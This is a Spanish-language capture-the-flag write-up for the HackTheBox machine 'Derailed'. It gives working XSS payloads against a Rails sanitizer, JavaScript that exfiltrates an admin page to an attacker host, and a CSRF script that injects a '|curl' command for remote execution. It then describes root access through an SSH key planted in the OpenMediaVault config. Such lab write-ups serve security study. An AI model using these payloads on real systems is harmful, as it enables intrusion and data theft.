---
title: Derailed - HackTheBox
categories: [ Linux ]
tags: [ HackTheBox ]
---

<img src="/assets/img/HTB/Derailed/Derailed.jpg">

Hola! Hoy completaremos la máquina [Derailed](https://app.hackthebox.com/machines/Derailed) de la plataforma [HackTheBox](https://app.hackthebox.com). Donde tocaremos los siguientes puntos:

- **Cross-Site Scripting (XSS)**
- **Cross-Site Request Forgery (CSRF)**
- **XSS + CSRF in order to steal admin website**
- **XSS + CSRF + Javascript File to get Remote Command Execution (RCE)**
- **Cracking Hashes [Lateral Movement]**
- **Exploiting OpenMediaVault [Privilege Escalation]** 

# Enumeración

## Escaneo de puertos

Comenzaremos con el típico escaneo de puertos con Nmap, al escanear el protocolo TCP, nos damos cuenta de 2 puertos abiertos.

```sh
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.190 -oG allPorts
Nmap scan report for 10.10.11.190
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63
```

Al escanear estos puertos más exhaustivamente, nos percatamos que el puerto 3000 es un servicio `HTTP`.

```sh
❯ nmap -p22,3000 -sCV 10.10.11.190 -oN targeted
Nmap scan report for 10.10.11.190

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 1623b09ade0e3492cb2b18170ff27b1a (RSA)
|   256 50445e886b3e4b5bf9341dede52d91df (ECDSA)
|_  256 0abd9223df44026f278da6abb4077837 (ED25519)
3000/tcp open  http    nginx 1.18.0
|_http-title: derailed.htb
|_http-server-header: nginx/1.18.0
```

## Enumeración Web

Al entrar al servicio web y fijarnos en el título, nos damos cuenta del dominio `derailed.htb`, asi que lo añadiremos al `/etc/hosts`

```sh
❯ echo '10.10.11.190 derailed.htb' | sudo tee -a /etc/hosts
10.10.11.190 derailed.htb
```

En la web no encontramos nada interesante, asi que fuzzearemos directorios con la herramienta `dirsearch`

![](/assets/img/HTB/Derailed/web.png)

El directorio `/rails/info/properties` nos da bastante información y nos dice que esto es un projecto de `Ruby on Rails`, también existe el directorio `/administration` pero no podemos verlo completamente

![](/assets/img/HTB/Derailed/web1.png)

Desde aqui, podemos intentar fuzzear otros directorios, asi que voy a usar la herramienta `feroxbuster` para hacerlo recursivamente, encontramos el directorio `/rails/info/routes`

![](/assets/img/HTB/Derailed/web2.png)

En este directorio nos da básicamente todas las rutas de la web.

## /clipnotes

Antes vimos la función de notas, nos damos cuenta que cuando hacemos una nos la identifica con un ID, la que acabo de crear tiene la ID 110

![](/assets/img/HTB/Derailed/id.png)

## /report 

En /report podemos reportar una nota para que un administrador la revise, con esto podemos pensar en un CSRF (Client-Site Request Forgery)

![](/assets/img/HTB/Derailed/report.png)

# Explotación

## XSS 

Después de buscar información por internet, encontré [este](https://groups.google.com/g/rubyonrails-security/c/ce9PhUANQ6s?pli=1) CVE, que es un XSS exploit para Rails::Html:Sanitizer, el exploit es el siguiente:

```html
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<select<style/><img src='http://10.10.14.226/xss'>
```

Al enviar el payload, recibimos una petición en nuestro servidor HTTP

![](/assets/img/HTB/Derailed/xss.png)

Ahora solo tenemos que explotar el XSS 

## XSS para /administrator

Para hacer el XSS, tenemos que explotar también un CSRF via el /report, y así robar la página de administrador, creamos un archivo javascript en nuestra máquina y lo ponemos en nuestro servidor HTTP

```js
var xmlHttp = new XMLHttpRequest();
xmlHttp.open("GET", "http://10.10.14.226/callback", false);
xmlHttp.send(null);
```

Esto no funciona, asi que vamos a traducir el payload con Char Coding, el payload quedaría asi.

```html
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<select<style/><img src='http://10.10.14.29/imgfail' onerror="eval(String.fromCharCode(118,97,114,32,120,109,108,72,116,116,112,32,61,32,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,10,120,109,108,72,116,116,112,46,111,112,101,110,40,34,71,69,84,34,44,32,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,50,50,54,47,99,97,108,108,98,97,99,107,34,44,32,102,97,108,115,101,41,59,10,120,109,108,72,116,116,112,46,115,101,110,100,40,110,117,108,108,41,59))">
```

Y el payload funciona, conseguimos un callback a nuestro servidor python

![](/assets/img/HTB/Derailed/xss1.png)

Después de investigar por HackTricks, usaremos este script para robar la página de administración de la web explotando también el CSRF via /report, el payload sería el siguiente:

```js
var url = "http://derailed.htb:3000/administration";
var attacker = "http://10.10.14.226/exfil";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', url, true);
xhr.send(null);
```

Al enviar el payload, nos devuelve la página web encodeada en base64

```html
<!DOCTYPE html>
<html>
<head>
  <title>derailed.htb</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>

  <meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="7__FwLHnDberOzsDGM4JxR4eCmp3dqyr8oGwEKFlZzbmHjj5aBFp2JrSbcSJB77Pvg1eEIncUqSxPNSX-7b7Hw" />
  

  <!-- Warning !! ensure that "stylesheet_pack_tag" is used, line below -->
  
  <script src="/packs/js/application-135b5cfa2df817d08f14.js" data-turbolinks-track="reload"></script>

  <link href="/js/vs/editor/editor.main.css" rel="stylesheet"/>
  <!-- Favicon-->
  <link rel="icon" type="image/x-icon" href="/assets/favicon.ico"/>
  <!-- Font Awesome icons (free version)-->
  <script src="https://use.fontawesome.com/releases/v6.1.0/js/all.js" crossorigin="anonymous"></script>
  <!-- Google fonts-->
  <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css"/>
  <link href="https://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
  <!-- Core theme CSS (includes Bootstrap)-->
  <link href="/css/styles.css" rel="stylesheet"/>
</head>
<body id="page-top">
<!-- Navigation-->
<nav class="navbar navbar-expand-lg bg-secondary text-uppercase fixed-top" id="mainNav">
  <div class="container">
    <a class="navbar-brand" href="/">CLIPNOTES</a>
    <button class="navbar-toggler text-uppercase font-weight-bold bg-primary text-white rounded" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
      Menu
      <i class="fas fa-bars"></i>
    </button>
    <div class="collapse navbar-collapse" id="navbarResponsive">
      <ul class="navbar-nav ms-auto">



            <li class="nav-item mx-0 mx-lg-1">
              <a class="nav-link py-3 px-0 px-lg-3 rounded" href="/administration">Administration</a>
            </li>


          <li class="nav-item mx-0 mx-lg-1">
            <a class="nav-link py-3 px-0 px-lg-3 rounded" href="/logout">Logout</a>
          </li>


      </ul>
    </div>
  </div>
</nav>

<header class="masthead">

  


  <style>
      button {
          background: none !important;
          border: none;
          padding: 0 !important;
          font-family: arial, sans-serif;
          color: #069;
          text-decoration: underline;
          cursor: pointer;
          margin-left: 30px;
      }
  </style>


  <div class="container">

    <h3>Reports</h3>




      <form method="post" action="/administration/reports">

        <input type="hidden" name="authenticity_token" id="authenticity_token" value="TePjtRtHDIKp0aX56JSC_Ii-Mz8h8FkId6lTCYik2FlEAh6MwrFo7Zg48z55XTX2KK1nRd9apwc0FDeO0ndEcA" autocomplete="off" />

        <input type="text" class="form-control" name="report_log" value="report_20_07_2023.log" hidden>

        <label class="pt-4"> 20.07.2023</label>

        <button name="button" type="submit">
          <i class="fas fa-download me-2"></i>
          Download
        </button>


      </form>






  </div>

</header>


<!-- Footer-->
<footer class="footer text-center">
  <div class="container">
    <div class="row">
      <!-- Footer Location-->
      <div class="col-lg-4 mb-5 mb-lg-0">
        <h4 class="text-uppercase mb-4">Location</h4>
        <p class="lead mb-0">
          2215 John Daniel Drive
          <br/>
          Clark, MO 65243
        </p>
      </div>
      <!-- Footer Social Icons-->
      <div class="col-lg-4 mb-5 mb-lg-0">
        <h4 class="text-uppercase mb-4"><a href="http://derailed.htb">derailed.htb</a></h4>
        <a class="btn btn-outline-light btn-social mx-1" href="#!"><i class="fab fa-fw fa-facebook-f"></i></a>
        <a class="btn btn-outline-light btn-social mx-1" href="#!"><i class="fab fa-fw fa-twitter"></i></a>
        <a class="btn btn-outline-light btn-social mx-1" href="#!"><i class="fab fa-fw fa-linkedin-in"></i></a>
        <a class="btn btn-outline-light btn-social mx-1" href="#!"><i class="fab fa-fw fa-dribbble"></i></a>
      </div>
      <!-- Footer About Text-->
      <div class="col-lg-4">
        <h4 class="text-uppercase mb-4">About derailed.htb</h4>
        <p class="lead mb-0">
          derailed.htb is a free to use service, which allows users to create notes within a few seconds.
        </p>
      </div>
    </div>
  </div>
</footer>
<!-- Copyright Section-->
<div class="copyright py-4 text-center text-white">
  <div class="container"><small>Copyright &copy; derailed.htb 2022</small></div>
</div>

<!-- Bootstrap core JS-->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
<script src="/js/scripts.js"></script>
<script src="https://cdn.startbootstrap.com/sb-forms-latest.js"></script>
</body>
</html>
```

## CSRF a RCE

Investigando un poco el código de la web, nos percatamos de que hay un formulario

```html
<h3>Reports</h3>
      <form method="post" action="/administration/reports">
        <input type="hidden" name="authenticity_token" id="authenticity_token" value="TePjtRtHDIKp0aX56JSC_Ii-Mz8h8FkId6lTCYik2FlEAh6MwrFo7Zg48z55XTX2KK1nRd9apwc0FDeO0ndEcA" autocomplete="off" />
        <input type="text" class="form-control" name="report_log" value="report_20_07_2023.log" hidden>
        <label class="pt-4"> 20.07.2023</label>
        <button name="button" type="submit">
          <i class="fas fa-download me-2"></i>
          Download
        </button>
      </form>
```

Ahora usando este código javascript, podemos realizar una ejecución remota de comandos

```sh
var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "http://derailed.htb:3000/administration", true);
xmlHttp.send( null );

setTimeout(function() {
    var doc = new DOMParser().parseFromString(xmlHttp.responseText, 'text/html');
    var token = doc.getElementById('authenticity_token').value;
    var newForm = new DOMParser().parseFromString('<form id="badform" method="post" action="/administration/reports">    <input type="hidden" name="authenticity_token" id="authenticity_token" value="placeholder" autocomplete="off">    <input id="report_log" type="text" class="form-control" name="report_log" value="placeholder" hidden="">    <button name="button" type="submit">Submit</button>', 'text/html');
    document.body.append(newForm.forms.badform);
    document.getElementById('badform').elements.report_log.value = '|curl http://10.10.14.226/rce';
    document.getElementById('badform').elements.authenticity_token.value = token;
    document.getElementById('badform').submit();
}, 3000);
```

Después de esperar un minuto a que el usuario administrador haga click en nuestro reporte, conseguimos en nuestro servicio HTTP la confirmación de la ejecución remota de comandos.

![](/assets/img/HTB/Derailed/xss2rce.png)

Después de esto, usamos una reverse shell y conseguimos una consola en el equipo

![](/assets/img/HTB/Derailed/shell.png)

# Escalada de Privilegios

Enumerando un poco el directorio donde aparecemos, nos fijamos que hay un directorio `openmediavault`

![](/assets/img/HTB/Derailed/omv.png)

En la carpeta `db`, hay un archivo sqlite3, donde podemos encontrar las credenciales hasheadas del usuario `openmediavault-opengui`

![](/assets/img/HTB/Derailed/john.png)

Ahora con estas credenciales podemos usar `su` para migrar al usuario

![](/assets/img/HTB/Derailed/su.png)

## OpenMediaVault

Listando los puertos abiertos internamente en la máquina, nos damos cuenta que en el puerto 80 corre el servicio owv

![](/assets/img/HTB/Derailed/netstat.png)

También, podemos leer el archivo de configuración de omv, situado en `/etc/openmediavault/config.xml`

### Configuración

Fijandonos en el archivo de configuración, esta parte es interesante.

![](/assets/img/HTB/Derailed/config.png)

## Explotación

Podemos crear un par de claves RSA y ponerlas en el archivo de configuración y editar el usuario test al usuario root, asi pondra nuestra clave pública en el archivo de autorización de claves del usuario root y asi poder conectarnos por SSH sin proporcionar ninguna contraseña, tendríamos que ejecutar estos comandos.

```sh
ssh-keygen -t rsa; ssh-keygen -e -f ~/.ssh/id_rsa.pub
```

Al introducir nuestra clave pública en el archivo, debería de quedar así

![](/assets/img/HTB/Derailed/config1.png)

Ahora tendremos que realizar los cambios para editar el modulo SSH, usaremos el comando `omv-rpc` situado en `/usr/sbin`.

![](/assets/img/HTB/Derailed/rpc.png)

Ahora solo falta conectarnos por ssh a la máquina victima como el usuario root.

![](/assets/img/HTB/Derailed/pwned.png)